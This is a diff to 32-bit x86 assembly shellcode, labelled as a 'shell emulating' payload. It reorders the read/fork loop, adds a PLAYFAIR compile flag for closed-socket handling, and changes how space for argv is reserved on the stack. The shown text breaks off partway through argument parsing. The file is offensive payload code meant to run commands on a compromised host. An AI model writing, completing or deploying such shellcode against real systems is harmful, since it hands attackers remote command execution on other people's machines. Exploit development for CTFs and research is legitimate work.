@@ -1,6 +1,6 @@
 	;; Evan Jensen 32bit shell emulating shellcode
 	;; 
-
+BITS 32
 	%include "short32.s"
 	%include "syscall.s"
 	%define BUFFERLEN 0x1ff
@@ -8,6 +8,22 @@
 	global main
 
 main:
+	
+get_input:
+	xor eax,eax
+	cdq
+	mov dx,BUFFERLEN
+	mov ecx,esp
+	xor ebx,ebx
+	SYSTEM_CALL(read)
+	mov ebp,eax
+	test eax,eax
+	
+%ifdef PLAYFAIR
+	jz short do_exit 	;test if socket is closed
+%endif
+	mov byte [esp+eax-1],0	
+	
 
 do_fork:
 	
@@ -15,42 +31,30 @@ do_fork:
 	test eax,eax
 	jz short child
 parent:
-	push byte 0
-	push byte 0
-	push byte 0
-	pop ebx
-	pop ecx
-	pop edx	
-	SYSTEM_CALL(waitpid)
-	jmp short do_fork
-child:
-	cld
-	
-get_input:
-	xor eax,eax
-	cdq
-	mov dx,BUFFERLEN
-	sub esp,edx
-	mov ecx,esp
 	xor ebx,ebx
-	SYSTEM_CALL(read)
-	mov ebp,eax
-	test eax,eax
-	jz short do_exit ;synchronous IO or GTFO
-	mov byte [eax+esp-1],0
+	xor ecx,ecx
+	xor edx,edx
+	SYSTEM_CALL(waitpid)
+	jmp short main
 
-
-	;; push eax ;return of read pushed by get_input
-	;; pop ecx
+child:
 	
+	cld
 	;let's parse the arguments here
-	xchg eax,ecx
+	
+%ifndef PLAYFAIR
+	test ebp,ebp		;return of read
+	jz short do_fork
+%endif
+	
+parse:
+	mov ecx, ebp
 	push byte " "		
 	pop eax			;space used for inlined strchr
 	mov ebx,esp
 	cdq			;msb of eax is zero so this is ok
 	
-	add esp,BUFFERLEN	;space for argv[]
+	sub esp,BUFFERLEN	;space for argv[]
 add_token: 	;; calculate the pointerp to push
 	
 	mov esi,ebp
